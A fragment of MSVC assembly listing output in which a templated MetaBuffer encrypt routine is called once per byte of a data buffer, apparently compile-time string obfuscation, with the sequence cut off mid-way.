  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<23,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
